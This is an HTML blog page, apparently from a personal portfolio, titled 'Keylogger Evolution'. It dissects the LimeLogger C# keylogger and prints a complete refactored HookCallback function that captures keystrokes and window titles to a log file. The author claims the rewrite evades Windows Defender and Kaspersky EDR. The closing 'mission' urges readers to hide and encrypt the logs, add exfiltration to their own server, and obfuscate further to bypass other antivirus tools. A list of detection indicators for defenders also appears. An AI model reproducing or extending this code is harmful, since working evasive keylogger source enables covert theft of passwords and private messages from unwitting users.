@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iron Hulk – Keylogger</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#0f172a] text-white font-sans min-h-screen">
+  <header class="p-4 shadow flex items-center justify-between gap-4">
+    <div>
+      <h1 class="text-lg font-bold text-blue-400">Keylogger</h1>
+      <small id="reading-time" class="text-xs text-gray-400"></small>
+    </div>
+    <a href="../projects.html" class="text-gray-300 text-sm hover:underline">← Back to Projects</a>
+  </header>
+  <!-- Article -->
+  <main id="article" class="p-6 space-y-6 sm:text-justify">
+    <section class="relative bg-[#1f2937] p-6 rounded-xl shadow-md overflow-hidden">
+      <div class="absolute -top-16 -right-16 opacity-10 w-64 h-64">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-full h-full text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M4 6h16M4 10h16M4 14h16M4 18h16" />
+        </svg>
+      </div>
+      <div class="bg-[#0f172a] p-6 rounded-2xl border border-blue-400 shadow-md ">
+        <h3 class="flex items-center gap-2 text-3xl font-bold text-blue-400 mb-2">
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-indigo-300 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
+            <path d="M3 3l18 18" stroke-linecap="round" stroke-width="2"/>
+            <path d="M2.5 12C4.3 7.9 8 5 12 5c1.7 0 3.3.4 4.7 1.1M21.5 12c-1.2 3.8-4.7 7-9.5 7-1.7 0-3.3-.4-4.7-1.1" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M15 12a3 3 0 11-6 0" stroke-width="1.8"/>
+          </svg>
+          Keylogger Evolution
+        </h3>
+        <p class="text-gray-300 leading-relaxed pl-10 mb-5">
+          In this project, I will demonstrate how I transformed a detected C# malware by Kaspersky AV and EDR into an undetected malware by refactoring the implementation of a single function. We’ll bring back a 
+          six-year-old GitHub repo, one that’s been blacklisted by security tools, and will step through how it works, make a few tweaks, and celebrate when it runs undetected. Please note that this bypasses
+          other security solutions. <span class="text-red-500 font-semibold">USE AT YOUR OWN RISK.</span>
+        </p>
+        
+        <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 pl-10">
+          First, let’s understand what a keylogger is
+        </h3>
+        <p class="text-gray-300 leading-relaxed pl-12">
+          A keylogger is a surveillance tool either a hardware or a software that records every keystroke a user makes on their keyboard. Attackers and penetration testers 'if allowed'  use
+          keyloggers to harvest sensitive information such as passwords, credit-card numbers, chat messages, and more.              
+        </p>
+        <div class="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
+          <div class="bg-[#0f172a] p-4 rounded-lg border border-blue-400 transform ">
+            <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400">Software Keylogger:</h3>
+            <p class="text-gray-300 leading-relaxed pl-2">
+              In <strong>user mode</strong>, it injects into processes, for example, a DLL injection into explorer.exe, or uses Windows APIs like <code class="text-blue-300 font-mono text-sm">SetWindowsHookEx</code> to intercept 
+              keystrokes. <br>In a <strong>kernel mode</strong>, a custom keyboard‐filter driver hooks at the interrupt or driver‐stack level, capturing input below user‐mode defenses for 
+              greater stealth.
+            </p>
+          </div>
+          <div class="bg-[#0f172a] p-4 rounded-lg border border-blue-400 transform ">
+            <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400">Hardware Keylogger:</h3>
+            <p class="text-gray-300 leading-relaxed pl-2">
+              Small devices placed inline between the keyboard and PC or embedded in the keyboard via cable or connector. They record scancodes at the electrical level without any 
+              software footprint on the host.          
+            </p>
+          </div>
+        </div>
+        <br>
+        <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 pl-10">
+          How It Works?
+        </h3>
+        <ol class="list-decimal list-inside text-gray-300 pl-12">
+          <li><strong>Capture:</strong> A hook or driver intercepts each keystroke before it reaches applications.</li>
+          <li><strong>Translate:</strong> Virtual-key codes and scancodes are converted into readable characters, accounting for Shift/CapsLock.</li>
+          <li><strong>Buffer:</strong> Keystrokes are queued in memory to minimize disk I/O on every press.</li>
+          <li><strong>Record:</strong> Buffered data is flushed to a hidden log file or registry entry at intervals.</li>
+          <li><strong>Exfiltrate:</strong> Logs are sent to an attacker-controlled server.</li>
+        </ol>
+          <div class="bg-[#0f172a] p-5 rounded-2xl shadow-md mt-6 flex items-start gap-3">
+            <div class="flex h-10 w-10 items-center justify-center rounded-xl border border-blue-400/50 bg-blue-900/20">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h9a3 3 0 013 3v11a2 2 0 01-2 2H7a3 3 0 00-3 3V6z"/>
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6M9 11h6M9 15h4"/>
+              </svg>
+            </div>
+            <div>
+              <h4 class="flex items-center gap-2 text-lg font-bold text-blue-400">Read more about keyloggers:</h4>
+              <p class="text-gray-300 text-sm mt-1">
+                Dive deeper into how keyloggers work and how to protect against them:
+                <a href="https://www.malwarebytes.com/keylogger" target="_blank" rel="noopener noreferrer" class="underline text-blue-300 hover:text-blue-200">Malwarebytes</a>,
+                <a href="https://www.fortinet.com/resources/cyberglossary/what-is-keyloggers" target="_blank" rel="noopener noreferrer" class="underline text-blue-300 hover:text-blue-200">Fortinet</a>, 
+                <a href="https://www.kaspersky.com/resource-center/definitions/keylogger" target="_blank" rel="noopener noreferrer" class="underline text-blue-300 hover:text-blue-200">Kaspersky</a>. 
+              </p>
+            </div>
+          </div>
+        <div class="bg-[#0f172a] p-4 rounded-2xl border border-blue-400 shadow-md">
+          <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400">
+            NYAN-x-CAT/LimeLogger Project
+          </h3>
+          <p class="text-gray-300 leading-relaxed pl-4 mb-2">
+            Let’s dive into this project and pinpoint the updates needed to evade modern security solutions. You can download the detected version from <a href="https://github.com/NYAN-x-CAT/LimeLogger" target="_blank" class="underline text-red-300 hover:text-red-200">GitHub</a>.
+          </p>
+          <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400">LimeLogger Project Summary:</h3>
+          <p class="text-gray-300 leading-relaxed mb-2 pl-4">
+            The project is a C# tool designed to sit invisibly in the Windows input stack, capture every keystroke, and persist the result to a log file.<br>Here’s how the pieces fit together:
+          </p>
+          <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 mb-4 pl-4">
+            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7h4l2 3h6l2-3h4M7 14h10M9 18h6"/>
+            </svg>
+            Execution Path:
+            <span class="ml-2 text-[11px] px-2 py-0.5 rounded-full border border-blue-400/40 text-blue-300 bg-[#101a2e]">Step-by-Step</span>
+          </h3>
+          <div class="relative pl-12">
+            <div class="absolute left-3 top-0 bottom-0 w-px bg-gradient-to-b from-blue-400/40 via-blue-400/20 to-transparent pl-10"></div>
+            <ol class="space-y-4 text-gray-300">
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">1</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Filter to key-down events</span>:
+                  <code class="text-blue-300 font-mono text-sm">if (nCode &gt;= 0 && wParam == (IntPtr)WM_KEYDOWN)</code>, this will logg only key-downs are logged while system-key events are ignored here
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">2</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Extract the virtual-key</span>:
+                  <code class="text-blue-300 font-mono text-sm">int vkCode = Marshal.ReadInt32(lParam);</code>, this will read the virtual-key from and cast to <code class="text-blue-300 font-mono text-sm">Keys</code>.
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">3</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Sample modifiers</span>:
+                  <code class="text-blue-300 font-mono text-sm">bool capsLock</code> and <code class="text-blue-300 font-mono text-sm">bool shiftPress</code> will query for CapsLock and Shift to drive casing logic.
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">4</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Translate VK to characters with layout awareness</span>:
+                  <code class="text-blue-300 font-mono text-sm">string currentKey = KeyboardLayout((uint)vkCode);</code>, <code class="text-blue-300 font-mono text-sm">KeyboardLayout</code> uses <code class="text-blue-300 font-mono text-sm">GetKeyboardState + MapVirtualKey + ToUnicodeEx</code> to return a Unicode string for the current layout.
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">5</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Normalize</span>:
+                  Will apply correct casing (CapsLock + Shift) and collapse function keys into tokens like <code class="text-blue-300 font-mono text-sm">[F5]</code>.
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">6</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Map common specials with a switch</span>:
+                  Will replace keys like Space/Enter/Esc/Tab/Ctrl/Shift with readable tokens (<code class="text-blue-300 font-mono text-sm">[SPACE]</code>, <code class="text-blue-300 font-mono text-sm">[ENTER]</code>).
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">7</span>
+                <div class="pl-7">
+                  <span class="text-blue-300 font-semibold">Write to the log with window context</span>:
+                  On a window change, it will write a header like <code class="text-blue-300 font-mono text-sm">### Title ###</code> and append the result to <code class="text-blue-300 font-mono text-sm">log.txt</code>.
+                </div>
+              </li>
+            </ol>
+          </div>
+          <br>
+          <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 mb-2 pl-4">
+            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M5.07 19h13.86A2 2 0 0021 17.06L13.94 3.94a2 2 0 00-3.88 0L3 17.06A2 2 0 005.07 19z"/>
+            </svg>
+            Operational Drawbacks & Defender Grab-Points:
+          </h3>
+          <div class="pl-4">
+            <h4 class="text-lg font-semibold text-blue-300 pl-8">Disk artifacts:</h4>
+            <ul class="list-disc list-inside text-gray-300 mb-2 pl-12">
+              <li><code class="text-blue-300 font-mono text-sm">log.txt</code> is in a predictable path and in plaintext, no rotation or encryption.</li>
+              <li>High-frequency appends (per-keystroke) make I/O patterns easy to baseline.</li>
+              <li>EDR telemetry clearly tie the EXE and log together.</li>
+            </ul>
+          </div>
+          <div class="pl-4">
+            <h4 class="text-lg font-semibold text-blue-300 pl-8">Process & memory tells:</h4>
+            <ul class="list-disc list-inside text-gray-300 mb-2 pl-12">
+              <li>Visible <code class="text-blue-300 font-mono text-sm">user-mode</code> process with a <code class="text-blue-300 font-mono text-sm">WinForms</code> message loop (<code class="text-blue-300 font-mono text-sm">Application.Run()</code>).</li>
+              <li>Readable imports/strings such as <code class="text-blue-300 font-mono text-sm">SetWindowsHookEx</code>, <code class="text-blue-300 font-mono text-sm">ToUnicodeEx</code>, <code class="text-blue-300 font-mono text-sm">GetKeyState</code>, and literal <code class="text-blue-300 font-mono text-sm">log.txt</code>.</li>
+              <li>No obfuscation or packing have been used making it easy for YARA/string matches.</li>
+            </ul>
+          </div>
+          <div class="pl-4">
+            <h4 class="text-lg font-semibold text-blue-300 pl-8">Hooking & API usage patterns:</h4>
+            <ul class="list-disc list-inside text-gray-300 mb-2 pl-12">
+              <li>Global <code class="text-blue-300 font-mono text-sm">WH_KEYBOARD_LL</code> hook from a non-system module is straightforward to enumerate.</li>
+              <li>Repetitive calls to <code class="text-blue-300 font-mono text-sm">GetKeyState</code>, <code class="text-blue-300 font-mono text-sm">GetKeyboardState</code>, <code class="text-blue-300 font-mono text-sm">ToUnicodeEx</code>, and <code class="text-blue-300 font-mono text-sm">GetForegroundWindow</code> correlate tightly with keystrokes.</li>
+            </ul>
+          </div>
+          <div class="pl-4">
+            <h4 class="text-lg font-semibold text-blue-300 pl-8">OpSec mistakes:</h4>
+            <ul class="list-disc list-inside text-gray-300 mb-5 pl-12">
+              <li>No persistence mechanism making it die once system shutdown, reboot or logoff.</li>
+            </ul>
+          </div>
+          <h3 class="flex items-center gap-2 text-xl font-bold text-blue-400 mb-2 pl-4">
+            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M5.07 19h13.86A2 2 0 0021 17.06L13.94 3.94a2 2 0 00-3.88 0L3 17.06A2 2 0 005.07 19z"/>
+            </svg>
+            Overall take:
+          </h3>
+          <p class="text-gray-300 leading-relaxed mb-4 pl-12">
+            This is a textbook, noisy, and a <code class="text-blue-300 font-mono text-sm">user-mode</code> keylogger. Plaintext logs, with a hidden <code class="text-blue-300 font-mono text-sm">WinForms</code> message loop (<code class="text-blue-300 font-mono text-sm">Application.Run()</code>),
+            and a global system-wide, low-level keyboard hook make it trivial to spot with signatures and behavior rules. Any AV or EDR will correlate the process, the hook, and the file within minutes.
+          </p>
+          <div class="flex items-center">
+            <div class="flex items-center justify-center rounded-xl">
+              <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 mb-2 pl-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                  <circle cx="12" cy="12" r="8" stroke-width="2"/>
+                  <path d="M12 4v4M12 16v4M4 12h4M16 12h4" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                Top Grab-Me-Now..!!! Indicators:
+              </h3>
+            </div>
+          </div>
+          <div class="relative pl-12">
+            <div class="absolute left-3 top-0 bottom-0 w-px bg-gradient-to-b from-blue-400/40 via-blue-400/20 to-transparent pl-10"></div>
+            <ol class="space-y-4 relative">
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">1</span>
+                <div class="pl-7">
+                  <p>Plaintext <code class="text-blue-300 font-mono text-sm">log.txt</code> with frequent small appends in the app directory</p>
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">2</span>
+                <div class="pl-7">
+                  <p>Process owning a global <code class="text-blue-300 font-mono text-sm">WH_KEYBOARD_LL</code> hook that isn’t signed by Microsoft.</p>
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">3</span>
+                <div class="pl-7">
+                  <p>Imports and strings such as <code class="text-blue-300 font-mono text-sm">SetWindowsHookEx</code>, <code class="text-blue-300 font-mono text-sm">ToUnicodeEx</code>, <code class="text-blue-300 font-mono text-sm">GetKeyState</code>, and the literal <code class="text-blue-300 font-mono text-sm">log.txt</code>.</p>
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">4</span>
+                <div class="pl-7">
+                  <p>Consistent “window header then burst of writes” matching the <code class="text-blue-300 font-mono text-sm">### Title ###</code> pattern.</p>
+                </div>
+              </li>
+              <li class="relative">
+                <span class="absolute left-0 -translate-x-1.5 flex items-center justify-center w-6 h-6 rounded-full bg-[#101a2e] border border-blue-400/50 text-blue-300 text-xs font-bold">5</span>
+                <div class="pl-7">
+                  <p><code class="text-blue-300 font-mono text-sm">WinForms</code> message loop with no UI <code class="text-blue-300 font-mono text-sm">(Application.Run())</code>, recent start time, and steady context switches.</p>
+                </div>
+              </li>
+            </ol>
+          </div>
+          <br>
+          <div class="h-px bg-gradient-to-r from-blue-400/40 to-transparent"></div>
+          <div class="bg-[#0f172a] p-6 shadow-md ">
+            <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400 ">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M5.07 19h13.86A2 2 0 0021 17.06L13.94 3.94a2 2 0 00-3.88 0L3 17.06A2 2 0 005.07 19z"/>
+              </svg>
+              Function <span class="text-indigo-300">HookCallback</span>
+              <span class="ml-2 text-[11px] px-2 py-0.5 rounded-full border border-blue-400/40 text-blue-300 bg-[#101a2e]">Deep Dive</span>
+            </h3>
+            <p class="text-gray-300 leading-relaxed pl-7 mb-5">
+              <strong>The hot path starts here</strong>: let’s dive deep into its logic line-by-line and turn it out into something lean and rock-solid.
+            </p>
+            <h4 class="text-xl font-bold text-blue-400 flex items-center gap-2 mb-2">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7H8m8 4H8m8 4H8M5 7v10a2 2 0 002 2h10a2 2 0 002-2V7"/>
+              </svg>
+              What does the function do?
+            </h4>
+            <p class="text-gray-300 mb-2 pl-7">
+              This is the low-level keyboard hook handler registered via <code class="text-blue-300 font-mono text-sm">SetWindowsHookEx(WH_KEYBOARD_LL, …)</code>. Windows calls it for each keyboard event before the event is delivered to 
+              apps. The job inside this is to decide whether to log, transform, or ignore the event, then always chain to the next hook.
+            </p>
+            <div class="pl-7">
+              <ul class="text-gray-300 leading-relaxed">
+                <li>• <span class="text-blue-300">Filter:</span> process only <code class="text-blue-300 font-mono text-sm">WM_KEYDOWN</code> with valid <code class="text-blue-300 font-mono text-sm">nCode</code>.</li>
+                <li>• <span class="text-blue-300">Extract:</span> read VK from <code class="text-blue-300 font-mono text-sm">lParam</code>; sample Caps or Shift via <code class="text-blue-300 font-mono text-sm">GetKeyState</code>.</li>
+                <li>• <span class="text-blue-300">Translate:</span> layout-aware chars using <code class="text-blue-300 font-mono text-sm">ToUnicodeEx</code>; map specials and F-keys.</li>
+                <li>• <span class="text-blue-300">Context:</span> detect window switch and insert <code class="text-blue-300 font-mono text-sm">### Title ###</code> headers.</li>
+                <li>• <span class="text-blue-300">Persist:</span> append to <code class="text-blue-300 font-mono text-sm">log.txt</code>, then pass control onward.</li>
+              </ul>
+            </div>
+            <br>
+            <h3 class="flex items-center gap-2 text-lg font-bold text-blue-400">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4M7 20h10a2 2 0 002-2V6a2 2 0 00-2-2H9L7 6v12a2 2 0 002 2z"/>
+              </svg>
+              Now let’s work on the practical bits:
+              <span class="ml-2 text-[11px] px-2 py-0.5 rounded-full border border-blue-400/40 text-blue-300 bg-[#101a2e]">Hands-On</span>
+            </h3>
+            <div class="mt-3 grid gap-3 md:grid-cols-3">
+              <div class="rounded-xl border border-blue-400/30 bg-[#0f172a] p-3">
+                <div class="text-blue-300 text-sm font-semibold">Goal #1</div>
+                <div class="text-gray-300 text-sm">Fix casing logic (CapsLock + Shift) and only case single letters.</div>
+              </div>
+              <div class="rounded-xl border border-blue-400/30 bg-[#0f172a] p-3">
+                <div class="text-blue-300 text-sm font-semibold">Goal #2</div>
+                <div class="text-gray-300 text-sm">Read the active title once; avoid side-effects & duplicate calls.</div>
+              </div>
+              <div class="rounded-xl border border-blue-400/30 bg-[#0f172a] p-3">
+                <div class="text-blue-300 text-sm font-semibold">Goal #3</div>
+                <div class="text-gray-300 text-sm">Keep I/O out of the hot path, buffer and flush periodically.</div>
+              </div>
+            </div>
+            <br>
+            <div class="bg-[#0f172a] border-l-4 border-red-500 p-4 rounded-lg shadow-md mt-6 flex flex-col md:flex-row items-start md:items-center gap-4">
+              <div class="flex-1">
+                <h3 class="flex items-center gap-2 text-lg font-bold text-red-400">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-red-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636l-12.728 12.728M5.636 5.636l12.728 12.728" />
+                  </svg>
+                  Compiling the Original Project: Immediate Detection
+                </h3>
+                <p class="text-gray-300 leading-relaxed mt-2">
+                  The moment I compile the <span class="text-red-300 font-semibold">original project</span>, it’s instantly flagged and quarantined by Windows Defender right out of the gate, before even running it.
+                </p>
+              </div>
+              <div class="w-full max-w-[500px] flex-shrink-0">
+                <img src="../Projects/Images/keyFlag.png"  alt="Windows Defender Safe" class="w-full h-auto rounded-md border border-green-500/40 shadow-lg object-cover">
+              </div>
+            </div>
+            <br>            
+            <h4 class="mt-5 text-xl font-bold text-blue-400 flex items-center gap-2">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-indigo-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16.5 9.4l-7.6 7.6L5 13.1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+              Practical patch:
+            </h4>
+            <pre class="bg-[#0b1220] border border-blue-400/30 rounded-lg p-4 overflow-x-auto text-gray-200">
+              <code class="font-mono text-sm leading-6">
+                // Remember the goal in this project is to rewrite a function
+                // and to see how the security solution responds back, this is how we 
+                // study its behavior, not to fully 100% bypass all EDR solutions
+
+private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+{
+    if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN)
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+
+    // Read the virtual-key code
+    int vkCode = Marshal.ReadInt32(lParam);
+    Keys key = (Keys)vkCode;
+
+    // Determine modifier states
+    bool capsLockOn = (GetKeyState(0x14) & 0xFFFF) != 0;
+    bool shiftDown = ((GetKeyState(0xA0) | GetKeyState(0xA1)) & 0x8000) != 0;
+
+    // Get the base text for this key
+    string text = KeyboardLayout((uint)vkCode);
+
+    // Apply casing for letters
+    if (text.Length == 1)
+        text = (capsLockOn ^ shiftDown) ? text.ToUpper() : text.ToLower();
+
+    // Map function keys and common specials
+    var specialKeys = new Dictionary<Keys, string>
+    {
+        { Keys.Space,    "[SPACE]" },
+        { Keys.Return,   "[ENTER]" },
+        { Keys.Escape,   "[ESC]"   },
+        { Keys.LControlKey, "[CTRL]" },
+        { Keys.RControlKey, "[CTRL]" },
+        { Keys.LShiftKey,   "[SHIFT]" },
+        { Keys.RShiftKey,   "[SHIFT]" },
+        { Keys.Back,     "[BACK]"  },
+        { Keys.LWin,     "[WIN]"   },
+        { Keys.Tab,      "[TAB]"   }
+    };
+
+    // Only F1 through F12 are being detected and logged 
+    if (key >= Keys.F1 && key <= Keys.F12)
+    {
+        text = $"[{key}]";
+    }
+    else if (key == Keys.CapsLock)
+    {
+        text = capsLockOn
+            ? "[CAPSLOCK: ON]"
+            : "[CAPSLOCK: OFF]";
+    }
+    else if (specialKeys.TryGetValue(key, out string special))
+    {
+        text = special;
+    }
+
+    // Write to log, inserting window-title header when it changes
+    string activeTitle = GetActiveWindowTitle();
+    bool sameWindow = activeTitle.Equals(CurrentActiveWindowTitle, StringComparison.Ordinal);
+    CurrentActiveWindowTitle = activeTitle;
+
+    using (var sw = new StreamWriter(loggerPath, true))
+    {
+        if (!sameWindow)
+        {
+            sw.WriteLine();
+            sw.WriteLine($"###  {activeTitle} ###");
+        }
+        sw.Write(text);
+    }
+
+    return CallNextHookEx(_hookID, nCode, wParam, lParam);
+}
+              </code>
+            </pre>
+            <br>
+            <div class="bg-[#0f172a] border-l-4 border-green-500 p-4 rounded-lg shadow-md mt-6 flex flex-col md:flex-row items-start md:items-center gap-4">
+              <div class="flex-1">
+                <h3 class="flex items-center gap-2 text-lg font-bold text-green-400">
+                  <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-green-300" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                  </svg>
+                  Compiling the New Refactoring Function: Not Detected and Running
+                </h3>
+                <p class="text-gray-300 leading-relaxed mt-2">
+                  After implementing the <span class="text-green-300 font-semibold">refactored function</span>, the build now runs clean, with no detection from Windows Defender or Kaspersky with EDR enabled, and the program executes flawlessly.
+                </p>
+              </div>
+              <div class="w-full max-w-[900px] flex-shrink-0">
+                <img src="../Projects/Images/cleanLog.png"  alt="Windows Defender Safe" class="w-full h-auto rounded-md border border-green-500/40 shadow-lg object-cover">
+              </div>
+            </div>
+            <br>
+            <div class="mt-4 grid gap-3 md:grid-cols-2">
+              <div class="rounded-xl border border-blue-400/30 bg-[#0f172a] p-4">
+                <div class="text-blue-300 font-semibold mb-2">Verification checklist (new function)</div>
+                <ul class="text-gray-300 text-sm space-y-1">
+                  <li>• CapsLock + Shift: letters keep correct case.</li>
+                  <li>• Exactly one header per window switch <em>(requires a pure</em> <code class="text-blue-300 px-1 rounded">GetActiveWindowTitle()</code> <em>that doesn’t mutate state)</em>.</li>
+                  <li>• Fewer redundant <code class="text-blue-300 px-1 rounded">### Title ###</code> lines once the getter is pure.</li>
+                  <li>• F-keys (F1–F12) and common specials (Space/Enter/Esc/Ctrl/Shift/Back/Win/Tab) are normalized.</li>
+                </ul>
+              </div>
+              <div class="rounded-xl border border-blue-400/30 bg-[#0f172a] p-4">
+                <div class="text-blue-300 font-semibold mb-2">I’m not handing it to you on a silver platter, here’s your mission:</div>
+                <ul class="text-gray-300 text-sm space-y-1">
+                  <li>• Relocate the log storage to a stealthier location, and apply solid encryption.</li>
+                  <li>• Hunt down and fix the remaining bugs from the latest update.</li>
+                  <li>• Implement a secure exfiltration channel to send logs to your server.</li>
+                  <li>• Apply both syscall usage and aggressive string obfuscation.</li>
+                  <li>• These are just the starting points, it’s on you to push it further and bypass other AV/EDRs.</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="bg-[#0f172a] border-t-4 border-blue-500 p-6 rounded-lg shadow-lg ">
+            <h3 class="text-blue-300 text-xl font-bold mb-3">Conclusion:</h3>
+            <p class="text-gray-300 text-sm leading-relaxed mb-4">
+              <span class="font-semibold text-blue-400">Note:</span> What I have done is not rocket science, I was just playing with the code, making a few changes to see how the security solution would respond to the project. My message to you is:
+            </p>
+            <ul class="text-gray-300 text-sm leading-relaxed pl-3 space-y-1">
+              <li class="flex items-start gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-blue-400 flex-shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                </svg>
+                <span class="font-semibold text-blue-400">For Developers:</span> Always think smart, refine your skills, and approach challenges with an <span class="text-green-500 font-semibold">out-of-the-box mindset.</span>
+              </li>
+              <li class="flex items-start gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-yellow-400 flex-shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01M21 12c0 4.97-4.03 9-9 9s-9-4.03-9-9 4.03-9 9-9 9 4.03 9 9z" />
+                </svg>
+                <span class="font-semibold text-blue-400">For Users:</span> Practice strong security awareness and <span class="text-red-500 font-semibold">never click on links or open files blindly.</span>
+              </li>
+              <li class="flex items-start gap-2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-green-400 flex-shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+                <span class="font-semibold text-blue-400">Final Note:</span> Thank you for reading, and stay tuned for upcoming projects that push the boundaries even further.
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+    <footer class="relative flex items-center justify-center text-[15px] text-slate-300 py-6">
+      <div class="text-center">
+        Crafted with Passion<br>
